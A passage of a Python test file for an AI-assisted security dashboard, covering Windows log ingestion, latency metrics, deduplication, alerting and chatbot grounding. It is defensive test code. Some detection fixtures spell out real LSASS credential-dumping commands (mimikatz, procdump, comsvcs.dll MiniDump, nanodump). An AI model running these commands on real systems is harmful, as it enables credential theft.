    src_sb2 = [sb for sb in at2.selectbox if "Select Telemetry Source" in sb.label][0]
    ep_sb2 = [sb for sb in at2.selectbox if "Filter by Endpoint Host" in sb.label][0]
    assert src_sb2.value == "REAL NXLOG WINDOWS (real_nxlog_windows)"
    assert ep_sb2.value == "Harsha"

    # --- Naturally append 2 new genuine Harsha events after the baseline ---
    post_baseline_lines = (
        "2026-10-12 02:00:01 Harsha INFO 7036 N/A The Windows Update service entered the running state.\n"
        "2026-10-12 02:00:03 Harsha AUDIT_SUCCESS 4624 NT AUTHORITY\\SYSTEM An account was successfully logged on.\n"
    )
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write(post_baseline_lines)

    # Trigger rerun on open session (simulating 5s watcher / interaction) — no manual sync click
    at2.run(timeout=30)
    assert not at2.exception
    assert _metric(at2, "Total Logs Analyzed") == "2"
    assert _metric(at2, "Live NXLog Stream") == "2"
    assert _metric(at2, "Correlated Incidents") == "0"
    lat_val_2 = _metric(at2, "Pipeline Latency")
    assert lat_val_2 is not None and lat_val_2 != "N/A" and lat_val_2 != "15.00 ms" and lat_val_2.endswith(" ms")

    # --- Session 3: Simulate Browser Reload (F5) after 2 post-baseline events arrived ---
    at3 = AppTest.from_file("dashboard/app.py", default_timeout=30).run(timeout=30)
    assert not at3.exception
    assert _metric(at3, "Total Logs Analyzed") == "2"
    assert _metric(at3, "Live NXLog Stream") == "2"
    assert _metric(at3, "Correlated Incidents") == "0"
    lat_val_3 = _metric(at3, "Pipeline Latency")
    assert lat_val_3 is not None and lat_val_3 != "N/A" and lat_val_3 != "15.00 ms" and lat_val_3.endswith(" ms")
    src_sb3 = [sb for sb in at3.selectbox if "Select Telemetry Source" in sb.label][0]
    ep_sb3 = [sb for sb in at3.selectbox if "Filter by Endpoint Host" in sb.label][0]
    assert src_sb3.value == "REAL NXLOG WINDOWS (real_nxlog_windows)"
    assert ep_sb3.value == "Harsha"


def test_pipeline_latency_changing_values_missing_measurement_and_zero_event_refreshes(monkeypatch, tmp_path):
    """
    Verifies Requirement 8:
    1. Missing measurements display 'N/A' (never a hardcoded constant like '15.00 ms' or '0.00 ms').
    2. Changing latency values across distinct ingested NXLog batches update the KPI metric and measurement scope.
    3. Zero-event refreshes ('No new events received') and repeated dashboard reruns preserve the latest valid
       measurement without overwriting it with a default or resetting it to '15.00 ms'.
    """
    import time as time_mod
    import config.settings as cfg_settings
    import analysis.parser as parser_mod

    tmp_log = tmp_path / "windows-events.log"
    tmp_cursor = tmp_path / "nxlog_cursor.json"
    tmp_baseline = tmp_path / "nxlog_demo_baseline.json"
    tmp_filters = tmp_path / "dashboard_filter_state.json"

    # Start with an empty receiver file and active clean baseline
    tmp_log.write_text("", encoding="utf-8")
    tmp_baseline.write_text(
        json.dumps({"byte_offset": 0, "active": True, "scenario": "reset"}),
        encoding="utf-8",
    )
    tmp_filters.write_text(
        json.dumps({
            "selected_source": "REAL NXLOG WINDOWS (real_nxlog_windows)",
            "selected_endpoint": "Harsha",
        }),
        encoding="utf-8",
    )

    monkeypatch.setattr(cfg_settings, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(parser_mod, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(cfg_settings, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(parser_mod, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(cfg_settings, "DEMO_BASELINE_FILE_PATH", tmp_baseline)
    monkeypatch.setattr(cfg_settings, "DASHBOARD_FILTER_STATE_FILE_PATH", tmp_filters)

    def _get_latency_metric(app_test):
        for m in app_test.metric:
            if "Pipeline Latency" in m.label:
                return m
        return None

    # 1. Missing measurement (0 events processed at clean baseline) -> must display "N/A"
    at = AppTest.from_file("dashboard/app.py", default_timeout=30).run(timeout=30)
    assert not at.exception
    lat_m0 = _get_latency_metric(at)
    assert lat_m0 is not None
    assert lat_m0.value == "N/A"
    assert "No measurement" in str(lat_m0.delta)

    # Zero-event manual synchronize click when still at 0 events -> must stay "N/A"
    sync_btn = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label][0]
    sync_btn.click()
    at.run(timeout=30)
    assert not at.exception
    assert _get_latency_metric(at).value == "N/A"

    # 2. Controlled monotonic perf_counter step to verify changing latency measurements across batches
    # Each perf_counter() call advances by step_sec[0]
    clock_state = {"now": 1000.0, "step": 0.002}  # 2.0 ms per step in Batch 1

    def fake_perf_counter():
        clock_state["now"] += clock_state["step"]
        return clock_state["now"]

    monkeypatch.setattr(time_mod, "perf_counter", fake_perf_counter)

    # Append Batch 1 (2 events from Harsha)
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write(
            "2026-10-12 03:00:01 Harsha INFO 7036 N/A Service state changed #1.\n"
            "2026-10-12 03:00:02 Harsha AUDIT_SUCCESS 4624 NT AUTHORITY\\SYSTEM Logon #1.\n"
        )

    at.run(timeout=30)
    assert not at.exception
    lat_m1 = _get_latency_metric(at)
    assert lat_m1 is not None
    val_batch1 = lat_m1.value
    delta_batch1 = lat_m1.delta
    assert val_batch1 != "N/A"
    assert val_batch1 != "15.00 ms"
    assert val_batch1.endswith(" ms")
    assert "End-to-End Live Batch (2 events," in str(delta_batch1)

    # 3. Zero-event refresh ("Synchronize NXLog Real Telemetry" with no new events) & repeated reruns
    # Change step to 0.050s so that if a zero-event refresh or rerun erroneously re-measured or overwrote,
    # the value would change or revert. It MUST preserve val_batch1!
    clock_state["step"] = 0.050
    sync_btn = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label][0]
    sync_btn.click()
    at.run(timeout=30)
    assert not at.exception
    lat_after_zero_sync = _get_latency_metric(at)
    assert lat_after_zero_sync.value == val_batch1
    assert lat_after_zero_sync.delta == delta_batch1

    # Trigger another UI rerun (e.g. search input change) with no new events
    search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
    search_inputs[0].set_value("Service state")
    at.run(timeout=30)
    assert not at.exception
    assert _get_latency_metric(at).value == val_batch1
    assert _get_latency_metric(at).delta == delta_batch1

    # 4. Append Batch 2 (3 new events from Harsha) with a different clock step (5.5 ms per step)
    clock_state["step"] = 0.0055
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write(
            "2026-10-12 03:01:01 Harsha INFO 7036 N/A Service state changed #2.\n"
            "2026-10-12 03:01:02 Harsha INFO 7040 NT AUTHORITY\\SYSTEM Service start type changed #2.\n"
            "2026-10-12 03:01:03 Harsha AUDIT_SUCCESS 4624 NT AUTHORITY\\SYSTEM Logon #2.\n"
        )

    search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
    search_inputs[0].set_value("")
    at.run(timeout=30)
    assert not at.exception
    lat_m2 = _get_latency_metric(at)
    val_batch2 = lat_m2.value
    delta_batch2 = lat_m2.delta
    assert val_batch2 != "N/A"
    assert val_batch2 != "15.00 ms"
    assert val_batch2 != val_batch1, f"Expected latency to update on new batch, got {val_batch2} == {val_batch1}"
    assert "End-to-End Live Batch (3 events," in str(delta_batch2)

    # 5. If latency state is explicitly missing when non-reset, dashboard displays "N/A" (never 15.00 ms)
    at.session_state["nxlog_pipeline_latency"] = None
    at.session_state["pipeline_latency_metrics"] = None
    at.run(timeout=30)
    assert not at.exception
    lat_missing = _get_latency_metric(at)
    assert lat_missing.value == "N/A"
    assert "No measurement available" in str(lat_missing.delta)


def test_final_audit_event_5379_bursts_lsass_false_positives_and_sector6_grounding():
    """
    Verifies all Final Stability Audit repairs:
    1. 7 distinct Event ID 5379 records at identical second-precision timestamp ('2026-10-12 14:26:58')
       with distinct byte offsets are preserved, while duplicate re-reads at the same byte offset
       (even with varying remote_peer_ip or hostname casing) are deduplicated.
    2. Routine machine account ('HARSHA$') and service account ('LOCAL SERVICE') Event ID 5379 records
       do not generate alerts or fallback MITRE mappings.
    3. Benign Windows Event ID 12 ('LSASS.exe was started as a protected process') and Event ID 225
       (Kernel-PnP lsass.exe device removal) do NOT trigger false-positive Critical LSASS dumping alerts,
       while genuine Sysmon Event ID 10 / Mimikatz LSASS access still triggers Critical T1003.001.
    4. Sector 6 AI SOC Chat Assistant Quick Actions and threat queries remain strictly grounded in
       active telemetry and never invent DC-PRIMARY, FINANCE-WORKSTATION, 185.220.101.5, or 0.08s latency.
    """
    from analysis.deduplicate import deduplicate_events, get_event_identity_key
    from analysis.enrich import enrich_events
    from agents.detection_agent import DetectionAgent
    from agents.correlation_agent import CorrelationAgent
    from agents.threat_intelligence_agent import ThreatIntelligenceAgent
    from llm.llm_client import LLMClient

    # 1. Seven distinct genuine Event ID 5379 records at 2026-10-12 14:26:58 with distinct record_offsets
    burst_5379 = [
        {
            "timestamp": "2026-10-12 14:26:58",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha" if idx % 2 == 0 else "HARSHA",
            "user": "Harsha",
            "source_ip": "N/A",
            "remote_peer_ip": "11.12.4.164",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "Credential Manager credentials were read. Read Operation: Enumerate Credentials",
            "record_offset": 44012000 + (idx * 382),
        }
        for idx in range(7)
    ]
    norm_burst = normalize_events(burst_5379)
    dedup_burst = deduplicate_events(norm_burst)
    assert len(dedup_burst) == 7, "All 7 distinct byte-offset Event ID 5379 records must be preserved"

    # Re-reading the exact same 7 records with transient remote_peer_ip='N/A' must deduplicate to 7
    reread_burst = [dict(e, remote_peer_ip="N/A", hostname="HARSHA-PC") for e in burst_5379]
    combined_dedup = deduplicate_events(norm_burst + normalize_events(reread_burst))
    assert len(combined_dedup) == 7, "Re-read of identical record_offset records must not duplicate rows"
    assert get_event_identity_key(norm_burst[0]) == get_event_identity_key(normalize_events(reread_burst)[0])

    # 2. Machine/service account routine 5379 & benign Windows Event IDs 12 and 225 mentioning lsass.exe
    benign_and_machine_events = [
        {
            "timestamp": "2026-10-12 14:16:33",
            "source": "real_nxlog_windows",
            "event_id": 12,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "NT AUTHORITY\\SYSTEM LSASS.exe was started as a protected process with level: 4.",
            "record_offset": 41205000,
        },
        {
            "timestamp": "2026-10-12 18:10:00",
            "source": "real_nxlog_windows",
            "event_id": 225,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "NT AUTHORITY\\SYSTEM The application \\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe with process id 1408 stopped the removal or ejection for the device PCI\\VEN_10DE.",
            "record_offset": 43100000,
        },
        {
            "timestamp": "2026-10-12 14:27:00",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha",
            "user": "HARSHA$",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "Credential Manager credentials were read.",
            "record_offset": 44015000,
        },
        {
            "timestamp": "2026-10-12 14:27:01",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha",
            "user": "LOCAL SERVICE",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "Credential Manager credentials were read.",
            "record_offset": 44015382,
        },
        {
            "timestamp": "2026-10-12 14:27:02",
            "source": "real_nxlog_windows",
            "event_id": 4798,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": r"C:\Windows\System32\svchost.exe",
            "command_line": "N/A",
            "description": "A user's local group membership was enumerated.",
            "record_offset": 44016000,
        },
    ]

    full_stream = enrich_events(deduplicate_events(normalize_events(burst_5379 + benign_and_machine_events)))
    # Machine/service 5379 must have mitre_technique == 'N/A'
    machine_5379 = [e for e in full_stream if e["event_id"] == 5379 and e["user"] in ("HARSHA$", "LOCAL SERVICE")]
    assert len(machine_5379) == 2
    assert all(e["mitre_technique"] == "N/A" for e in machine_5379)

    alerts = DetectionAgent().detect(full_stream)
    # Only the 7 Harsha user 5379 events + 1 Harsha user 4798 event should alert (8 alerts total; 0 LSASS Critical alerts)
    assert len(alerts) == 8
    assert not any(a["rule_id"] == "RULE-CRED-LSASS-10" for a in alerts)
    assert all(a["severity"] == "Low" for a in alerts)

    incidents = ThreatIntelligenceAgent().analyze(CorrelationAgent().correlate(alerts))
    assert len(incidents) == 1
    inc = incidents[0]
    assert inc["incident_id"] == "INC-E8541E"
    assert inc["incident_name"] == "Account Discovery & Credential Manager Read Activity"
    assert inc["severity"] == "Low"

    # Genuine Sysmon Event ID 10 LSASS access still triggers Critical RULE-CRED-LSASS-10
    real_lsass_attack = normalize_events([
        {
            "timestamp": "2026-10-12 15:00:00",
            "source": "Sysmon",
            "event_id": 10,
            "hostname": "DC-PRIMARY",
            "user": "SYSTEM",
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "description": "Process accessed LSASS memory space (Target: lsass.exe).",
        }
    ])
    lsass_alerts = DetectionAgent().detect(real_lsass_attack)
    assert len(lsass_alerts) == 1
    assert lsass_alerts[0]["rule_id"] == "RULE-CRED-LSASS-10"
    assert lsass_alerts[0]["severity"] == "Critical"

    # 3. Sector 6 Chatbot Grounding
    llm = LLMClient()
    chat_ctx = {
        "logs": full_stream,
        "alerts": alerts,
        "incidents": incidents,
        "network_state": {"sender_ip_current": "11.12.4.164", "receiver_ip_current": "11.12.7.72"},
        "agent_performance": {"pipeline_latency_ms": 42.75, "latency_scope": "End-to-End Live Batch (8 events, 5.34 ms/evt)"},
    }

    r_explain = llm.query_chatbot(
        f"Explain the active incident ({inc['incident_name']}) and its severity rationale based on current telemetry.",
        chat_ctx,
    )
    assert "INC-E8541E" in r_explain
    assert "Harsha" in r_explain
    assert "DC-PRIMARY" not in r_explain
    assert "185.220.101.5" not in r_explain

    r_logs = llm.query_chatbot(
        "Show the supporting Windows Event IDs, hosts, users, and processes in the current telemetry window.",
        chat_ctx,
    )
    assert "5379" in r_logs and "4798" in r_logs
    assert "Harsha" in r_logs
    assert "0.08 seconds" not in r_logs

    r_mitre = llm.query_chatbot(
        "What MITRE ATT&CK techniques are triggered in the current stream and what do they mean?",
        chat_ctx,
    )
    assert "T1555.004" in r_mitre and "T1087.001" in r_mitre

    r_mitigate = llm.query_chatbot(
        "What safe mitigation and SOAR response actions are recommended for the current incidents?",
        chat_ctx,
    )
    assert "INC-E8541E" in r_mitigate
    assert "Dry-Run" in r_mitigate

    r_ransom = llm.query_chatbot("Are there any ransomware or vssadmin shadow copy attacks?", chat_ctx)
    assert "FINANCE-WORKSTATION" not in r_ransom
    assert "0" in r_ransom

    r_stats = llm.query_chatbot("How many logs and what is the pipeline latency?", chat_ctx)
    assert "42.75 ms" in r_stats
    assert "0.08 seconds" not in r_stats


def test_500_log_limit_separation_of_received_processed_displayed_and_refresh_counters(monkeypatch, tmp_path):
    """
    Verifies the 500-log limit investigation & counter separation requirements:
    1. When >500 post-baseline events exist (630 raw genuine records = 620 unique + 10 duplicate EventRecordIDs),
       Total Logs Analyzed and Live NXLog Stream do NOT freeze at 500; they report all 620 unique processed events.
    2. Dashboard counters accurately distinguish:
       - Total Genuine Events Received (630)
       - Total Unique Events Processed (620)
       - Events Currently Displayed (500, bounded by NXLOG_DISPLAY_WINDOW_LIMIT)
       - New Events (Current Refresh) (620 on initial load -> 0 on zero-event sync -> 5 on auto-refresh -> 3 on manual sync)
    3. Events beyond the 500-event display window are NOT lost from nxlog_live_events / nxlog_security_logs
       and remain searchable without duplication.
    4. Real NXLog telemetry from Harsha remains separate from simulated telemetry.
    """
    import config.settings as cfg_settings
    import analysis.parser as parser_mod

    tmp_log = tmp_path / "windows-events.log"
    tmp_cursor = tmp_path / "nxlog_cursor.json"
    tmp_baseline = tmp_path / "nxlog_demo_baseline.json"
    tmp_filters = tmp_path / "dashboard_filter_state.json"

    # Seed 620 unique genuine Harsha records + 10 duplicate RecordNumber records = 630 raw genuine events
    raw_lines = []
    for idx in range(620):
        rec_num = 10000 + idx
        msg = (
            f"Service state changed #{idx} EARLY_EVENT_BEYOND_500_WINDOW"
            if idx == 0
            else f"Service state changed #{idx} routine telemetry."
        )
        raw_lines.append(
            json.dumps({
                "EventTime": f"2026-10-12 04:{(idx // 60) % 60:02d}:{idx % 60:02d}",
                "Hostname": "Harsha",
                "EventID": 7036,
                "SourceName": "Service Control Manager",
                "Channel": "System",
                "AccountName": "SYSTEM",
                "Severity": "INFO",
                "RecordNumber": rec_num,
                "Message": msg,
            })
        )
    # Append 10 duplicate transmissions of RecordNumber 10000..10009
    for idx in range(10):
        rec_num = 10000 + idx
        msg = (
            f"Service state changed #{idx} EARLY_EVENT_BEYOND_500_WINDOW"
            if idx == 0
            else f"Service state changed #{idx} routine telemetry."
        )
        raw_lines.append(
            json.dumps({
                "EventTime": f"2026-10-12 04:{(idx // 60) % 60:02d}:{idx % 60:02d}",
                "Hostname": "Harsha",
                "EventID": 7036,
                "SourceName": "Service Control Manager",
                "Channel": "System",
                "AccountName": "SYSTEM",
                "Severity": "INFO",
                "RecordNumber": rec_num,
                "Message": msg,
            })
        )

    tmp_log.write_text("\n".join(raw_lines) + "\n", encoding="utf-8")
    tmp_baseline.write_text(
        json.dumps({"byte_offset": 0, "active": True, "scenario": "reset"}),
        encoding="utf-8",
    )
    tmp_filters.write_text(
        json.dumps({
            "selected_source": "REAL NXLOG WINDOWS (real_nxlog_windows)",
            "selected_endpoint": "Harsha",
        }),
        encoding="utf-8",
    )

    monkeypatch.setattr(cfg_settings, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(parser_mod, "NXLOG_FILE_PATH", tmp_log)
    monkeypatch.setattr(cfg_settings, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(parser_mod, "NXLOG_CURSOR_FILE_PATH", tmp_cursor)
    monkeypatch.setattr(cfg_settings, "DEMO_BASELINE_FILE_PATH", tmp_baseline)
    monkeypatch.setattr(cfg_settings, "DASHBOARD_FILTER_STATE_FILE_PATH", tmp_filters)

    def _metric(app_test, label_substr):
        for m in app_test.metric:
            if label_substr in m.label:
                return m.value
        return None

    # 1. Initial load with 630 raw / 620 unique post-baseline events
    at = AppTest.from_file("dashboard/app.py", default_timeout=30).run(timeout=30)
    assert not at.exception, f"AppTest failed on >500 events: {at.exception}"

    assert _metric(at, "Total Logs Analyzed") == "620"
    assert _metric(at, "Live NXLog Stream") == "620"
    assert _metric(at, "Total Genuine Events Received") == "630"
    assert _metric(at, "Total Unique Events Processed") == "620"
    assert _metric(at, "Events Currently Displayed") == "500"
    assert _metric(at, "New Events (Current Refresh)") == "620"

    assert at.session_state["total_genuine_events_received"] == 630
    assert at.session_state["total_unique_events_processed"] == 620
    assert at.session_state["events_currently_displayed"] == 500
    assert at.session_state["new_events_current_refresh"] == 620
    assert len(at.session_state["nxlog_security_logs"]) == 620

    # Verify early event #0 (beyond the 500-event display window) was NOT lost from nxlog_security_logs
    early_matches = [
        e for e in at.session_state["nxlog_security_logs"]
        if "EARLY_EVENT_BEYOND_500_WINDOW" in str(e.get("description", ""))
    ]
    assert len(early_matches) == 1

    # 2. Zero-event manual synchronization -> New Events (Current Refresh) becomes 0, no duplication
    sync_btn = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label][0]
    sync_btn.click()
    at.run(timeout=30)
    assert not at.exception
    assert _metric(at, "Total Genuine Events Received") == "630"
    assert _metric(at, "Total Unique Events Processed") == "620"
    assert _metric(at, "Events Currently Displayed") == "500"
    assert _metric(at, "New Events (Current Refresh)") == "0"
    assert at.session_state["new_events_current_refresh"] == 0

    # 3. Automatic refresh on file growth (+5 new unique Harsha events)
    auto_batch = [
        json.dumps({
            "EventTime": f"2026-10-12 05:00:0{i}",
            "Hostname": "Harsha",
            "EventID": 7040,
            "SourceName": "Service Control Manager",
            "Channel": "System",
            "AccountName": "SYSTEM",
            "Severity": "INFO",
            "RecordNumber": 20000 + i,
            "Message": f"Auto-ingested event #{i}",
        })
        for i in range(5)
    ]
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write("\n".join(auto_batch) + "\n")

    at.run(timeout=30)
    assert not at.exception
    assert _metric(at, "Total Genuine Events Received") == "635"
    assert _metric(at, "Total Unique Events Processed") == "625"
    assert _metric(at, "Total Logs Analyzed") == "625"
    assert _metric(at, "Live NXLog Stream") == "625"
    assert _metric(at, "Events Currently Displayed") == "500"
    assert _metric(at, "New Events (Current Refresh)") == "5"

    # 4. Manual synchronization with +3 unique and +2 duplicate raw events (+5 raw total)
    manual_batch = [
        json.dumps({
            "EventTime": f"2026-10-12 05:01:0{i}",
            "Hostname": "Harsha",
            "EventID": 4624,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "Channel": "Security",
            "AccountName": "SYSTEM",
            "Severity": "INFO",
            "RecordNumber": 30000 + i,
            "Message": f"Manual-synced logon #{i}",
        })
        for i in range(3)
    ] + [
        json.dumps({
            "EventTime": f"2026-10-12 05:01:0{i}",
            "Hostname": "Harsha",
            "EventID": 4624,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "Channel": "Security",
            "AccountName": "SYSTEM",
            "Severity": "INFO",
            "RecordNumber": 30000 + i,
            "Message": f"Manual-synced logon #{i}",
        })
        for i in range(2)
    ]
    with open(tmp_log, "a", encoding="utf-8") as f:
        f.write("\n".join(manual_batch) + "\n")

    sync_btn = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label][0]
    sync_btn.click()
    at.run(timeout=30)
    assert not at.exception
    assert _metric(at, "Total Genuine Events Received") == "640"
    assert _metric(at, "Total Unique Events Processed") == "628"
    assert _metric(at, "Total Logs Analyzed") == "628"
    assert _metric(at, "Live NXLog Stream") == "628"
    assert _metric(at, "Events Currently Displayed") == "500"
    assert _metric(at, "New Events (Current Refresh)") == "3"

    # 5. Search for the earliest event (#0, 628 events ago) -> found in full stream and displayed
    search_inputs = [ti for ti in at.text_input if "Search Live Stream" in ti.label]
    search_inputs[0].set_value("EARLY_EVENT_BEYOND_500_WINDOW")
    at.run(timeout=30)
    assert not at.exception
    assert _metric(at, "Total Unique Events Processed") == "628"
    assert _metric(at, "Events Currently Displayed") == "1"
    assert _metric(at, "New Events (Current Refresh)") == "0"


def test_lsass_event_225_and_12_false_positive_fix_and_4625_correlation_preservation():
    """
    Regression test for false-positive RULE-CRED-LSASS-10 on Kernel-PnP Event ID 225:
    1. A benign Event ID 225 with 'Process command line: C:\\WINDOWS\\system32\\lsass.exe'
       (both parsed from raw multiline NXLog text and normalized directly) does NOT
       trigger a Critical credential-dumping alert.
    2. A benign Event ID 12 referencing LSASS in description, process_name, or command_line
       does NOT trigger an LSASS credential-dumping alert.
    3. Bare 'lsass.exe' or 'C:\\Windows\\System32\\lsass.exe' in command_line alone does NOT
       trigger RULE-CRED-LSASS-10, while genuine suspicious LSASS access/dumping cases
       (Sysmon Event ID 10, Mimikatz, ProcDump, comsvcs.dll MiniDump, nanodump) continue to trigger.
    4. Two genuine Event ID 4625 failed-logon events still produce RULE-AUTH-4625 (Medium)
       alerts and correlate into High severity incident (INC-8CD2F1) under CorrelationAgent.
    """
    from analysis.deduplicate import deduplicate_events
    from analysis.enrich import enrich_events
    from agents.threat_intelligence_agent import ThreatIntelligenceAgent

    reader = NXLogReader()
    # Exact multiline Kernel-PnP Event ID 225 observed from Harsha at byte offset 41336112
    raw_multiline_225 = (
        "2026-10-12 05:35:05 Harsha WARNING 225 NT AUTHORITY\\SYSTEM "
        "The application \\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe with process id 1408 "
        "stopped the removal or ejection for the device PCI\\VEN_8086&DEV_467F&SUBSYS_159C1025&REV_00\\3&11583659&0&70.\n"
        "Process command line: C:\\WINDOWS\\system32\\lsass.exe\n"
        "List of affected devices:\n"
        "STORAGE\\Volume\\{bfa73ec3-04c3-11ee-bf83-806e6f6e6963}#0000000047500000"
    )
    parsed_225 = reader.parse_line(raw_multiline_225)
    assert parsed_225 is not None
    assert parsed_225["event_id"] == 225
    assert parsed_225["command_line"] == r"C:\WINDOWS\system32\lsass.exe"

    benign_events = normalize_events([
        parsed_225,
        {
            "timestamp": "2026-10-12 05:35:06",
            "source": "real_nxlog_windows",
            "event_id": 225,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": r"C:\Windows\System32\lsass.exe",
            "command_line": r"C:\Windows\System32\lsass.exe",
            "description": (
                r"The application \Device\HarddiskVolume4\Windows\System32\lsass.exe "
                r"stopped the removal or ejection for the device."
            ),
            "record_offset": 41336500,
        },
        {
            "timestamp": "2026-10-12 05:35:07",
            "source": "real_nxlog_windows",
            "event_id": 12,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": r"C:\Windows\System32\lsass.exe",
            "command_line": r"C:\Windows\System32\lsass.exe",
            "description": r"NT AUTHORITY\SYSTEM LSASS.exe was started as a protected process with level: 4.",
            "record_offset": 41337000,
        },
        {
            "timestamp": "2026-10-12 05:35:08",
            "source": "real_nxlog_windows",
            "event_id": 4688,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": r"C:\Windows\System32\lsass.exe",
            "command_line": r"C:\Windows\System32\lsass.exe",
            "description": "A new process has been created.",
            "record_offset": 41337500,
        },
    ])

    det = DetectionAgent()
    corr = CorrelationAgent()
    assert det.detect(benign_events) == []

    # Verify that combining benign Event ID 225 & 12 with routine Harsha 5379/4798 events
    # does NOT escalate Harsha's routine activity to a Critical LSASS incident (INC-54F131)
    routine_with_225 = enrich_events(
        deduplicate_events(
            benign_events
            + normalize_events([
                {
                    "timestamp": "2026-10-12 05:35:10",
                    "source": "real_nxlog_windows",
                    "event_id": 5379,
                    "hostname": "Harsha",
                    "user": "Harsha",
                    "process_name": "N/A",
                    "command_line": "N/A",
                    "description": "Credential Manager credentials were read.",
                    "record_offset": 41338000,
                },
                {
                    "timestamp": "2026-10-12 05:35:11",
                    "source": "real_nxlog_windows",
                    "event_id": 4798,
                    "hostname": "Harsha",
                    "user": "Harsha",
                    "process_name": r"C:\Windows\System32\svchost.exe",
                    "command_line": "N/A",
                    "description": "A user's local group membership was enumerated.",
                    "record_offset": 41338500,
                },
            ])
        )
    )
    routine_alerts = det.detect(routine_with_225)
    assert len(routine_alerts) == 2
    assert not any(a["rule_id"] == "RULE-CRED-LSASS-10" for a in routine_alerts)
    routine_incs = ThreatIntelligenceAgent().analyze(corr.correlate(routine_alerts))
    assert len(routine_incs) == 1
    assert routine_incs[0]["incident_id"] == "INC-E8541E"
    assert routine_incs[0]["severity"] == "Low"

    # Verify genuine suspicious LSASS credential-dumping cases still trigger Critical RULE-CRED-LSASS-10
    suspicious_lsass_cases = normalize_events([
        {
            "timestamp": "2026-10-12 06:00:01",
            "source": "Sysmon",
            "event_id": 10,
            "hostname": "Harsha",
            "user": "SYSTEM",
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "description": "Process accessed LSASS memory space (Target: lsass.exe).",
        },
        {
            "timestamp": "2026-10-12 06:00:02",
            "source": "real_nxlog_windows",
            "event_id": 4688,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "procdump.exe",
            "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
            "description": "A new process has been created.",
        },
        {
            "timestamp": "2026-10-12 06:00:03",
            "source": "real_nxlog_windows",
            "event_id": 4688,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 1408 C:\\temp\\lsass.dmp full",
            "description": "A new process has been created.",
        },
        {
            "timestamp": "2026-10-12 06:00:04",
            "source": "real_nxlog_windows",
            "event_id": 4688,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "nanodump.exe",
            "command_line": "nanodump.exe --pid 1408 --write lsass_dump.bin",
            "description": "A new process has been created.",
        },
    ])
    susp_alerts = det.detect(suspicious_lsass_cases)
    assert len(susp_alerts) == 4
    for al in susp_alerts:
        assert al["rule_id"] == "RULE-CRED-LSASS-10"
        assert al["severity"] == "Critical"
        assert al["mitre_technique"] == "T1003.001"

    # Verify two genuine Event ID 4625 failed-logon events still produce RULE-AUTH-4625 (Medium)
    # and correlate into High severity incident INC-8CD2F1
    failed_logon_events = normalize_events([
        {
            "timestamp": "2026-10-12 22:33:59",
            "source": "real_nxlog_windows",
            "event_id": 4625,
            "hostname": "Harsha",
            "user": "guest",
            "source_ip": "11.12.4.164",
            "process_name": "-",
            "command_line": "N/A",
            "description": "An account failed to log on.",
            "record_offset": 46545320,
        },
        {
            "timestamp": "2026-10-12 22:34:02",
            "source": "real_nxlog_windows",
            "event_id": 4625,
            "hostname": "Harsha",
            "user": "guest",
            "source_ip": "11.12.4.164",
            "process_name": "-",
            "command_line": "N/A",
            "description": "An account failed to log on.",
            "record_offset": 46547200,
        },
    ])
    auth_alerts = det.detect(failed_logon_events)
    assert len(auth_alerts) == 2
    assert all(a["rule_id"] == "RULE-AUTH-4625" and a["severity"] == "Medium" for a in auth_alerts)

    auth_incs = ThreatIntelligenceAgent().analyze(corr.correlate(auth_alerts))
    assert len(auth_incs) == 1
    assert auth_incs[0]["incident_id"] == "INC-8CD2F1"
    assert auth_incs[0]["incident_name"] == "Automated Brute Force & Password Spraying Attack"
    assert auth_incs[0]["severity"] == "High"
    assert auth_incs[0]["confidence"] == 90
    assert auth_incs[0]["affected_host"] == "Harsha"
    assert auth_incs[0]["affected_user"] == "guest"
    assert auth_incs[0]["window_alert_count"] == 2


def test_context_aware_privilege_escalation_detection_and_correlation():
    """
    Unit and regression verification for Context-Aware Privilege Escalation Enhancement:
    1. Event ID 4688 command-line parsing does not capture explanatory text when command line is blank.
    2. Event ID 4672 extracts actual privilege list from multiline text and JSON records.
